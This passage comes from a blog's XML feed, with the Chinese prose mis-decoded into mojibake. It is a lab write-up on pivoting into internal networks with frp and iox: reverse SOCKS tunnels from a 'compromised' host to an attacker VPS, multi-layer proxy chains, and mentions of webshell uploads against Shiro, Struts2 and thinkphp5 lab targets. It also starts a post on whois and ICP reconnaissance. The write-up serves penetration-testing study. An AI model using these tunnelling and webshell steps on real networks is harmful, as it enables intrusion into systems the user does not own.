192.168.100.11</code>é‡Œå¯ä»¥é€š<br><img src="https://img.tucang.cc/api/image/show/3df322bf1c7b6f6d35c894c5e1ae81a1" alt="image.png"><br>ç°åœ¨å°±æœ‰äº†ä¸¤ä¸ªç½‘ç»œ <code>vuln_network</code> å’Œ <code>vuln_network2</code><br><img src="https://img.tucang.cc/api/image/show/bee46fee34cfd52be156716fc1ee96bf" alt="image.png"><br><img src="https://img.tucang.cc/api/image/show/1c6329d388b62fdd703ae6fd7174fc53" alt="image.png"><br>å…¶ä¸­åªæœ‰ <code>192.168.100.10</code>æ˜ å°„åˆ°å¤–ç½‘ï¼Œå¯ä»¥é€šè¿‡æ­¤ä¸»æœºè¿›è¡Œå¤šå±‚æ¸—é€è®­ç»ƒã€‚<br>åšäº†äºŒå±‚ä»£ç†åè®¿é—® <code>192.168.1.3</code>ï¼š<br><img src="https://img.tucang.cc/api/image/show/06ba78317dbe8465354ef75eb5ccfd01" alt="image.png"></p><h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p>åŸç†å°±æ˜¯<code>åˆ›å»ºç½‘ç»œ</code>ï¼Œ<code>å°†å®¹å™¨åŠ è¿›ç½‘ç»œ</code>ï¼Œè¿˜å¯ä»¥ç”¨ <code>docker swarm</code> è¿›è¡Œé›†ç¾¤ç®¡ç†ï¼Œä»¥åå†æ¢ç´¢ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>Network</tag>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å†…ç½‘ç©¿é€</title>
    <link href="/2023/07/29/nat/"/>
    <url>/2023/07/29/nat/</url>
    
    <content type="html"><![CDATA[<h1 id="Frp"><a href="#Frp" class="headerlink" title="Frp"></a>Frp</h1><p>æ ¹æ®å¯¹åº”çš„æ“ä½œç³»ç»ŸåŠæ¶æ„ï¼Œä» <a href="https://github.com/tnodir/fort">Release</a> é¡µé¢ä¸‹è½½æœ€æ–°ç‰ˆæœ¬çš„ç¨‹åºã€‚<br>å°† <strong>frps</strong> åŠ <strong>frps.ini</strong> æ”¾åˆ°å…·æœ‰<strong>å…¬ç½‘</strong> IP çš„æœºå™¨ä¸Šã€‚( s - server )<br>å°† <strong>frpc</strong> åŠ <strong>frpc.ini</strong> æ”¾åˆ°å¤„äº<strong>å†…ç½‘</strong>ç¯å¢ƒçš„æœºå™¨ä¸Šã€‚( c - client )</p><p>è®¿é—®è·¯å¾„ï¼š<br><code>æ”»å‡»æœº</code> -&gt; <code>VPS(è·‘frpsçš„)</code> -&gt; <code>å†…ç½‘ä¸­è½¬æœº(è·‘frpcçš„)</code> -&gt; <code>è®¿é—®å†…ç½‘å…¶å®ƒç¯å¢ƒ</code></p><h2 id="é…ç½®-frps"><a href="#é…ç½®-frps" class="headerlink" title="é…ç½® frps"></a>é…ç½® frps</h2><p>ä¿®æ”¹ <code>frps.ini</code> æ–‡ä»¶ï¼Œè¿™é‡Œä½¿ç”¨äº†æœ€ç®€åŒ–çš„é…ç½®</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># frps.ini</span><br><span class="hljs-section">[common]</span><br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">1000</span><br></code></pre></td></tr></table></figure><p>å¯åŠ¨ <code>frps</code></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle">.<span class="hljs-regexp">/frps -c ./</span>frps.ini<br>å¦‚æœéœ€è¦åå°è¿è¡Œï¼š<br>nohup frps -c frps.ini &gt;<span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> &amp;<br></code></pre></td></tr></table></figure><h2 id="é…ç½®-frpc"><a href="#é…ç½®-frpc" class="headerlink" title="é…ç½® frpc"></a>é…ç½® frpc</h2><p>ä¿®æ”¹ frpc.ini æ–‡ä»¶ï¼Œå‡è®¾ frps æ‰€åœ¨æœåŠ¡å™¨çš„å…¬ç½‘ IP ä¸º <code>x.x.x.x</code></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># frpc.ini</span><br>[common]<br>server_addr = IP <span class="hljs-comment">#vpsåœ°å€ </span><br>server_port = 10808 <span class="hljs-comment">#vpsç›‘å¬ç«¯å£ </span><br><br>[plugin_socks]<br>type = tcp<br>remote_port = 12345 <span class="hljs-comment">#ä»£ç†ç«¯å£ </span><br>plugin = socks5<br>plugin_user =<br>plugin_passwd = <span class="hljs-comment">#ä»£ç†å¯†ç </span><br></code></pre></td></tr></table></figure><p>å¯åŠ¨ <code>frpc</code></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle">.<span class="hljs-regexp">/frpc -c ./</span>frpc.ini<br>å¦‚æœéœ€è¦åå°è¿è¡Œï¼š<br>nohup frpc -c frpc.ini &gt;<span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> &amp;<br></code></pre></td></tr></table></figure><h2 id="è¿æ¥ä»£ç†"><a href="#è¿æ¥ä»£ç†" class="headerlink" title="è¿æ¥ä»£ç†"></a>è¿æ¥ä»£ç†</h2><p>å‡è®¾æˆ‘ä»¬å·²ç»æ§åˆ¶äº†ä¸€å°å†…ç½‘æœºå™¨ï¼Œå†…ç½‘ä¸­å­˜åœ¨å¦ä¸€ä¸ªä¸»æœºå¼€å¯äº† Web æœåŠ¡ã€‚</p><p><img src="https://img.tucang.cc/api/image/show/0545d9a0cd6ae6c5aa3ac3ede78f6b3f" alt="image.png"></p><p>ç½‘ç»œä¸º <code>192.168.174.0/24</code> æ®µ<br>å­˜åœ¨ Web æœåŠ¡çš„ä¸»æœº IP ä¸º <code>192.168.174.128</code>ï¼Œæˆ‘ä»¬æ­£å¸¸æ˜¯è®¿é—®ä¸äº†çš„</p><p><img src="https://img.tucang.cc/api/image/show/aeb9e24cc1e3c68a33e3df94970be24e" alt="image.png"></p><p>å†™å¥½ <code>frps</code> é…ç½®æ–‡ä»¶</p><p><img src="https://img.tucang.cc/api/image/show/473fd78b3f112b5a1f8169eb514737d1" alt="image.png"></p><p>å¯åŠ¨ <code>frps</code></p><p><img src="https://img.tucang.cc/api/image/show/6da6f3dff4c6d53e116aa015bd76dcd0" alt="image.png"></p><p>åœ¨ <code>192.168.174.132</code>ä¸Šé…ç½® <code>frpc.ini</code></p><p><img src="https://img.tucang.cc/api/image/show/8f34820b0ed6da08a21e837cbebc628d" alt="image.png"></p><p>å¯åŠ¨ <code>frpc</code></p><p><img src="https://img.tucang.cc/api/image/show/c52e5ec63468366a860c99ff57be729d" alt="image.png"></p><p>Server ç«¯æ¥æ”¶åˆ°è¿æ¥ï¼Œè¿æ¥æˆåŠŸ</p><p><img src="https://img.tucang.cc/api/image/show/0e38addc73002f10fb5163bcc8fedea5" alt="image.png"></p><ol><li>ä½¿ç”¨ <code>Proxifier</code></li></ol><p>æ·»åŠ ä»£ç†</p><p><img src="https://img.tucang.cc/api/image/show/78c0c375936bee50f6a222950ab13939" alt="image.png"></p><p>è®¾ç½®è§„åˆ™</p><p><img src="https://img.tucang.cc/api/image/show/f49d7f233b9af27aaeca20abe65a2a4b" alt="image.png"></p><p>è®¿é—®æˆåŠŸ</p><p><img src="https://img.tucang.cc/api/image/show/506aaa46205c4d4d0d1cff98a97ce32b" alt="image.png"></p><ol start="2"><li>ä½¿ç”¨æµè§ˆå™¨æ’ä»¶&#x2F;é…ç½®ç³»ç»Ÿä»£ç†</li></ol><p>ä½¿ç”¨ <code>SwitchyOmega</code> æ’ä»¶é…ç½®ä»£ç†</p><p><img src="https://img.tucang.cc/api/image/show/a45074f92f61e3550a28fdc6e4e5babd" alt="image.png"></p><p>é€‰æ‹©ä»£ç†</p><p><img src="https://img.tucang.cc/api/image/show/ad2aff088ee0df89fb1ecc44ae4dc70b" alt="image.png"></p><p>è®¿é—®æˆåŠŸ</p><p><img src="https://img.tucang.cc/api/image/show/87e923a2cb0f13c67251ee8b577060e6" alt="image.png"></p><p>ç³»ç»Ÿä»£ç†åŒç†ï¼Œåœ¨ socks proxy å¡«ä¸Š server ip &amp; port å³å¯ï¼š</p><p><img src="https://img.tucang.cc/api/image/show/487d27c526ebd1c9d101205f7c22a25e" alt="image.png"></p><h2 id="äºŒå±‚ä»£ç†"><a href="#äºŒå±‚ä»£ç†" class="headerlink" title="äºŒå±‚ä»£ç†"></a>äºŒå±‚ä»£ç†</h2><p>ä¸ºäº†ç®€ä¾¿(æ‡’)ï¼Œä¸å¼€é‚£ä¹ˆå¤šå®¹å™¨&#x2F;ä¸»æœºï¼Œç›´æ¥åœ¨é…ç½®æ–‡ä»¶é™åˆ¶ Web æœåŠ¡ä»…æœ¬æœºç™»å½•ï¼Œæ­£å¸¸è®¿é—®æ˜¯è¿™æ ·çš„ï¼š</p><p><img src="https://img.tucang.cc/api/image/show/c648787bfe55e205a4ec7c463be64029" alt="image.png"></p><p>å•çº¯ä¸ºäº†å­¦ä¹ æ­å»ºä»£ç†ï¼Œå°±ä¸é…ç½®æ¼æ´ç¯å¢ƒäº†(æ‡’)ï¼Œè¿™é‡Œå‡è®¾æˆ‘ä»¬é€šè¿‡ <code>192.168.174.132</code> æ‰“è¿›äº† <code>192.168.174.128</code>ï¼Œéœ€è¦ç”¨ <code>192.168.174.128</code>ï¼Œç»§ç»­æ­å»ºä»£ç†ä¸­è½¬æ¥æ¸—é€å¦ä¸€ä¸ªç½‘æ®µã€‚</p><p><strong>è®¿é—®è·¯å¾„ï¼š</strong><br><code>æ”»å‡»æœº</code> -&gt; <code>VPS(è·‘frpsçš„)</code> -&gt; <code>ä¸€å±‚å†…ç½‘ä¸­è½¬æœº(192.168.174.132)</code> -&gt; <code>äºŒå±‚å†…ç½‘ä¸­è½¬æœº(192.168.174.128)</code> -&gt; <code>è®¿é—®å†…ç½‘å…¶å®ƒç¯å¢ƒ</code></p><h3 id="é…ç½®æ–‡ä»¶"><a href="#é…ç½®æ–‡ä»¶" class="headerlink" title="é…ç½®æ–‡ä»¶"></a>é…ç½®æ–‡ä»¶</h3><p>æ”¾åœ¨äºŒå±‚å†…ç½‘é‡Œçš„ä¸»æœºï¼š<code>frpc.ini</code>ï¼Œå¦‚ <code>192.168.174.128</code></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs abnf">//frpc.ini<br><br>[common]<br>server_addr <span class="hljs-operator">=</span> <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>  //ä¸€å±‚å†…ç½‘ä¸»æœºåœ°å€<br>server_port <span class="hljs-operator">=</span> <span class="hljs-number">10809</span>  //ä¸€å±‚å†…ç½‘ä¸»æœºç›‘å¬ç«¯å£<br><br>[socks5]<br><span class="hljs-attribute">type</span><span class="hljs-operator">=</span>tcp<br>remote_port <span class="hljs-operator">=</span> <span class="hljs-number">12346</span><br><span class="hljs-attribute">plugin</span> <span class="hljs-operator">=</span> socks5<br></code></pre></td></tr></table></figure><p>æ”¾åœ¨ä¸€å±‚å†…ç½‘é‡Œçš„ä¸»æœºï¼š<code>frps.ini</code>ï¼Œå¦‚  <code>192.168.174.132</code></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-comment">//frps.ini</span><br><span class="hljs-string"></span><br><span class="hljs-string">[common]</span><br>bind_port = <span class="hljs-number">10809</span><br></code></pre></td></tr></table></figure><p><code>frps</code>:</p><p><img src="https://img.tucang.cc/api/image/show/9ba64eb2d5016d853b47560c278cb3b4" alt="image.png"></p><p><code>frpc</code>:</p><p><img src="https://img.tucang.cc/api/image/show/9093f04dbadaaa212d308f8257c9dc7a" alt="image.png"></p><p>æ¥æ”¶åˆ°äº†ä¿¡å·</p><p><img src="https://img.tucang.cc/api/image/show/639e7c8da84d066eb71cb9cd51889772" alt="image.png"></p><h3 id="é…ç½®-Proxychains"><a href="#é…ç½®-Proxychains" class="headerlink" title="é…ç½® Proxychains"></a>é…ç½® Proxychains</h3><p>åˆ›å»ºä¸€ä¸ª Chainsï¼Œå¹¶æŒ‰é¡ºåºæ‹–å…¥ä»£ç†ï¼Œé¡ºåºä»ä¸Šåˆ°ä¸‹</p><p><img src="https://img.tucang.cc/api/image/show/26bd547fe709f04e66ea148faf428542" alt="image.png"></p><p>é…ç½®åæˆåŠŸè®¿é—®</p><p><img src="https://img.tucang.cc/api/image/show/8851042f2e5d2f4175d6741912e5ceeb" alt="image.png"></p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>å¤šå±‚ä»£ç†çš„åŸç†æ˜¯ä¸€æ ·çš„ï¼Œä¸Šå±‚ä»£ç†ï¼ˆå¦‚ä¸€å±‚ï¼‰è¿è¡Œ <code>frps</code>ï¼Œä¸‹ä¸€å±‚ï¼ˆå¦‚äºŒå±‚ï¼‰è¿è¡Œ <code>frpc</code>æ—¶çš„ <code>server</code>åœ°å€ä¸ºä¸€å±‚çš„åœ°å€ï¼Œç«¯å£ä¸ºä¸Šå±‚ä»£ç†çš„ç›‘å¬ç«¯å£ <code>(bind_port)</code>ï¼Œè®¾ç½®ä»£ç†æ—¶æ‰€å¡«çš„ IP ä¸ºä¸€å±‚ä¸»æœºçš„ IPï¼Œç«¯å£å¡«äºŒå±‚ä¸»æœºé‡Œçš„ <code>remote_port</code></p><h1 id="IOX"><a href="#IOX" class="headerlink" title="IOX"></a>IOX</h1><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>ç«¯å£è½¬å‘ &amp; å†…ç½‘ä»£ç†å·¥å…·ï¼ŒåŠŸèƒ½ç±»ä¼¼äº <code>lcx/ew</code>ï¼Œä½†æ˜¯æ¯”å®ƒä»¬æ›´å¥½</p><h2 id="å·¥ä½œæ¨¡å¼"><a href="#å·¥ä½œæ¨¡å¼" class="headerlink" title="å·¥ä½œæ¨¡å¼"></a>å·¥ä½œæ¨¡å¼</h2><h3 id="fwd"><a href="#fwd" class="headerlink" title="fwd"></a>fwd</h3><p>ç›‘å¬ <code>0.0.0.0:8888</code> å’Œ <code>0.0.0.0:9999</code>ï¼Œå°†ä¸¤ä¸ªè¿æ¥é—´çš„æµé‡è½¬å‘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./iox fwd -l 8888 -l 9999<br></code></pre></td></tr></table></figure><p>ç›‘å¬ <code>0.0.0.0:8888</code>ï¼ŒæŠŠæµé‡è½¬å‘åˆ° <code>1.1.1.1:9999</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./iox fwd -l 8888 -r 1.1.1.1:9999<br></code></pre></td></tr></table></figure><p>è¿æ¥ <code>1.1.1.1:8888</code> å’Œ <code>1.1.1.1:9999</code>, åœ¨ä¸¤ä¸ªè¿æ¥é—´è½¬å‘</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">./iox fwd -r <span class="hljs-number">1.1.1.1</span>:<span class="hljs-number">8888</span> -r <span class="hljs-number">1.1.1.1</span>:<span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure><h3 id="proxy"><a href="#proxy" class="headerlink" title="proxy"></a>proxy</h3><p>åœ¨æœ¬åœ° <code>0.0.0.0:1080</code>å¯åŠ¨ Socks5 æœåŠ¡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./iox proxy -l 1080<br></code></pre></td></tr></table></figure><p>åœ¨è¢«æ§æœºå¼€å¯ Socks5 æœåŠ¡ï¼Œå°†æœåŠ¡è½¬å‘åˆ°å…¬ç½‘ VPS<br>åœ¨ VPS ä¸Šè½¬å‘ <code>0.0.0.0:9999</code> åˆ° <code>0.0.0.0:1080</code><br>ä½ å¿…é¡»å°†ä¸¤æ¡å‘½ä»¤æˆå¯¹ä½¿ç”¨ï¼Œå› ä¸ºå®ƒå†…éƒ¨åŒ…å«äº†ä¸€ä¸ªç®€å•çš„åè®®æ¥æ§åˆ¶å›è¿</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./iox</span> proxy -r 1.1.1.1<span class="hljs-function">:9999</span><br><span class="hljs-string">./iox</span> proxy -l 9999 -l 1080       <span class="hljs-string">//</span> æ³¨æ„ï¼Œè¿™ä¸¤ä¸ªç«¯å£æ˜¯æœ‰é¡ºåºçš„<br></code></pre></td></tr></table></figure><p>æ¥ç€è¿æ¥å†…ç½‘ä¸»æœº</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># proxychains.conf</span><br><span class="hljs-comment"># socks5://1.1.1.1:1080</span><br><br>$ proxychains rdesktop 192.168.0.100:3389<br></code></pre></td></tr></table></figure><p>è¯¦ç»†å¯æµè§ˆ <a href="https://github.com/EddieIvan01/iox/blob/master/README.md">å®˜æ–¹æ–‡æ¡£</a></p><h2 id="ä½¿ç”¨æ–¹æ³•"><a href="#ä½¿ç”¨æ–¹æ³•" class="headerlink" title="ä½¿ç”¨æ–¹æ³•"></a>ä½¿ç”¨æ–¹æ³•</h2><p>æ‰€æœ‰çš„å‚æ•°éƒ½æ˜¯ç»Ÿä¸€çš„ã€‚<code>-l/--local</code>æ„ä¸ºç›‘å¬æœ¬åœ°ç«¯å£ï¼›<code>-r/--remote</code> æ„ä¸ºè¿æ¥è¿œç«¯ä¸»æœº<br>æ³¨æ„: <code>v0.4</code> ç‰ˆæœ¬ä¹‹åï¼Œ<code>-l/--local</code>å‚æ•°å¯ä»¥æŒ‡å®šç›‘å¬å“ªä¸ª IPã€‚å¦‚æœåªæŒ‡å®šäº†ç«¯å£ï¼Œåˆ™é»˜è®¤æ˜¯ <code>0.0.0.0:PORT</code></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns">-l <span class="hljs-number">127.0.0.1</span>:<span class="hljs-number">9999</span>      -l *<span class="hljs-number">127.0.0.1</span>:<span class="hljs-number">9999</span>      # <span class="hljs-number">127.0.0.1</span>:<span class="hljs-number">9999</span><br>-l <span class="hljs-number">9999</span>                -l *<span class="hljs-number">9999</span>                # <span class="hljs-number">0.0.0.0</span>:<span class="hljs-number">9999</span><br><br>`-l :<span class="hljs-number">9999</span>`ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œä½†å¹¶ä¸æ¨èã€‚å› ä¸º`-l *:<span class="hljs-number">9999</span>`(ç›‘å¬<span class="hljs-number">0.0.0.0</span>:<span class="hljs-number">9999</span>ï¼Œå¼€å¯åŠ å¯†)ä¼šæœ‰æ­§ä¹‰<br></code></pre></td></tr></table></figure><h2 id="å¼€æ"><a href="#å¼€æ" class="headerlink" title="å¼€æ"></a>å¼€æ</h2><p>æäº† docker é¶åœºï¼ˆç»ˆäºï¼‰</p><ul><li><code>192.168.100.10</code> æ˜¯è·³æ¿æœºï¼Œå¼€å¯äº† Shiro æœåŠ¡ï¼Œå¤–ç½‘å¯è®¿é—®</li><li><code>192.168.100.11</code> æ˜¯å†…ç½‘æœåŠ¡å™¨ï¼Œå¼€å¯äº† st2ï¼Œå¤–ç½‘ä¸å¯è®¿é—®</li></ul><p><img src="https://img.tucang.cc/api/image/show/524069ee3316300650fd645fb29bea4a" alt="image.png"><br>ä¿®æ”¹ <code>/etc/proxychains.conf</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">socks5  0.0.0.0 10888<br></code></pre></td></tr></table></figure><p>ç›‘å¬å¹¶æ˜ å°„ç«¯å£</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./iox proxy -l 22222 -l 10888<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨è¿‡ç¨‹ä¸å¤šè¯´ï¼Œå†™å…¥ğŸåä¸Šä¼  iox<br><img src="https://img.tucang.cc/api/image/show/be705e6c9ae39c5490590f51905a84cb" alt="image.png"><br>åœ¨ç›®æ ‡æœºå™¨ä¸Š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./iox proxy -r x.x.x.x:22222<br></code></pre></td></tr></table></figure><p>æ¥æ”¶åˆ°è¿æ¥<br><img src="https://img.tucang.cc/api/image/show/35af87acfe9e48f789e66c92196029af" alt="image.png"><br>é…ç½® <code>Proxifier</code> æˆ–æµè§ˆå™¨æ’ä»¶éƒ½å¯ä»¥ï¼Œä»£ç†åœ°å€ä¸º <code>x.x.x.x:10888</code>ï¼Œ<code>22222</code> æ˜¯å®¢æˆ·ç«¯è¿æ¥çš„ç«¯å£ï¼Œ<code>10888</code> æ˜¯æˆ‘ä»¬ä»£ç†è¿æ¥çš„ç«¯å£ï¼Œ<code>iox</code> ä¼šå¯¹ <code>22222</code> ç«¯å£å’Œ <code>10888</code> ç«¯å£çš„æµé‡è¿›è¡Œè½¬å‘ï¼Œæ³¨æ„é¡ºåºï¼Œ<code>22222</code> å’Œ <code>10888</code> ä¸èƒ½äº’æ¢ã€‚</p><p>å¯ç”¨å†…ç½‘åœ°å€è®¿é—® Shiro<br><img src="https://img.tucang.cc/api/image/show/00574c2960b8fb17a2cf954a8daadb0e" alt="image.png"><br>è®¿é—® st2 çš„æœºå­ <code>192.168.100.11:8080</code><br>Docker ä¸­æœ‰ struts2 å…¨ç‰ˆæœ¬çš„æ¼æ´å¹³å°ï¼Œéœ€è¦æ£€æµ‹å“ªä¸€ä¸ªæ¼æ´å°±ç›´æ¥æ›´æ”¹åœ°å€å³å¯ï¼Œè¿™é‡Œä»¥ <code>S2-001</code>ä¸ºä¾‹ï¼š<br><code>192.168.100.11:8080/S2-001/</code><br><img src="https://img.tucang.cc/api/image/show/19e6d2ac53acccd565d4492519a10816" alt="image.png"></p><p>è‡³æ­¤å†…ç½‘è½¬å‘æˆåŠŸ</p><p><img src="https://img.tucang.cc/api/image/show/306c4b46e8283096d3e90fd9f77526b1" alt="image.png"></p><p>åœ°å€ä¹Ÿç¡®è®¤æ˜¯ <code>192.168.100.11</code></p><p><img src="https://img.tucang.cc/api/image/show/17122e2829121500aa84197db50c1a51" alt="image.png"></p><p>è¿›æ¥ç€æ·»åŠ æ–°ç½‘ç»œï¼Œst2 æœ‰ä¸¤ä¸ªç½‘å¡ï¼ŒIP ä¸º <code>192.168.1.2</code><br><img src="https://img.tucang.cc/api/image/show/c28994af0616e4a4e62a4cb8926997ae" alt="image.png"><br>è¿™ä¸ªç½‘æ®µå†…å­˜åœ¨ <code>192.168.1.3</code>ï¼Œå¼€å¯äº† <code>thinkphp5</code> æœåŠ¡<br><code>Shiro1 192.168.100.10</code> çš„ä¸»æœºåªåœ¨ä¸€ä¸ªç½‘ç»œå†…ï¼Œå› æ­¤ä¸ tk5 æ˜¯ä¸é€šçš„<br><img src="https://img.tucang.cc/api/image/show/88ac5e58e178ecc1bed16625fd945b00" alt="image.png"><br>åœ¨ <code>st2 192.168.100.11</code>é‡Œå¯ä»¥é€š<br><img src="https://img.tucang.cc/api/image/show/3df322bf1c7b6f6d35c894c5e1ae81a1" alt="image.png"><br>ç°åœ¨ä¸ºåŒç½‘å¡<br><img src="https://img.tucang.cc/api/image/show/db4a4dd070da6b3b59b12b986bf1ef4f" alt="image.png"><br>ä¸Šä¼ å°é©¬<br><img src="https://img.tucang.cc/api/image/show/1ccdd38b6a951670e661d0fe6a30d6b8" alt="image.png"><br>ä¸Šä¼ å¤§é©¬<br><img src="https://img.tucang.cc/api/image/show/5e08673717ab06b1185397ff1c07a49c" alt="image.png"><br>è¿æ¥ä¸Šå»åå¼€å§‹ä¸Šä¼  iox å»ºç«‹ä»£ç†<br><img src="https://img.tucang.cc/api/image/show/80a649ef1cc60b5598c67a4e31bad8b3" alt="image.png"><br>åœ¨ <code>192.168.100.10</code> ä¸Šå¼€å¯ç›‘å¬ <code>2222</code> å’Œ <code>1080</code>ï¼Œ<code>192.168.100.11</code> ä¸Šè¿æ¥ <code>2222</code><br><img src="https://img.tucang.cc/api/image/show/dc1251c2e765e5d0d68972fb6adeb411" alt="image.png"><br>è®¾ç½® <code>chains</code>ï¼Œè¿æ¥æˆåŠŸ<br><img src="https://img.tucang.cc/api/image/show/06ba78317dbe8465354ef75eb5ccfd01" alt="image.png"></p><h2 id="Summary-1"><a href="#Summary-1" class="headerlink" title="Summary"></a>Summary</h2><p>iox ç›¸æ¯”èµ· frp æ˜¯æ›´åŠ çš„ç®€ä¾¿ï¼Œiox yydsï¼</p><h1 id="To-be-continued"><a href="#To-be-continued" class="headerlink" title="To be continued"></a>To be continued</h1><p>å…ˆæ•´ç†äº† frpï¼Œæ›´å¤šä»£ç†å·¥å…·æŒ–å‘å¾…å¡«ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>Network</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Webä¿¡æ¯æ”¶é›†</title>
    <link href="/2023/07/20/WebSearching/"/>
    <url>/2023/07/20/WebSearching/</url>
    
    <content type="html"><![CDATA[<h1 id="æ”¶é›†åŸŸåä¿¡æ¯"><a href="#æ”¶é›†åŸŸåä¿¡æ¯" class="headerlink" title="æ”¶é›†åŸŸåä¿¡æ¯"></a>æ”¶é›†åŸŸåä¿¡æ¯</h1><h2 id="whoisæŸ¥è¯¢"><a href="#whoisæŸ¥è¯¢" class="headerlink" title="whoisæŸ¥è¯¢"></a>whoisæŸ¥è¯¢</h2><p>1ã€åŸŸåwhoisæŸ¥è¯¢-ç«™é•¿ä¹‹å®¶</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>whois.chinaz.com/<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/46b1980aa85bb1e2d56ea76b88e982f2"></p><p>2ã€IP138ç½‘ç«™</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>site.ip138.com/<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/55335d9779561d3ed448beaed7e48db0"></p><p>3ã€åŸŸåä¿¡æ¯æŸ¥è¯¢-è…¾è®¯äº‘</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>whois.cloud.tencent.com/<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/dfaa5b0d44d0919044e8069b6e04b0a3"></p><p>4ã€ICANN LOOKUP</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">https:</span>//lookup.icann<span class="hljs-meta">.org</span>/<br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/55a5a5736cfad9b2db6d0e87f1cbcdd5"></p><h2 id="å¤‡æ¡ˆä¿¡æ¯æŸ¥è¯¢"><a href="#å¤‡æ¡ˆä¿¡æ¯æŸ¥è¯¢" class="headerlink" title="å¤‡æ¡ˆä¿¡æ¯æŸ¥è¯¢"></a>å¤‡æ¡ˆä¿¡æ¯æŸ¥è¯¢</h2><p>1ã€SEOç»¼åˆæŸ¥è¯¢</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.aizhan.com<span class="hljs-regexp">/cha/</span><br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/e14d14c8a3b47af4719e51b53ef85fb6"></p><p>2ã€ICPå¤‡æ¡ˆæŸ¥è¯¢-ç«™é•¿å·¥å…·</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//i</span>cp.chinaz.com/<br></code></pre></td></tr></table></figure><p><img 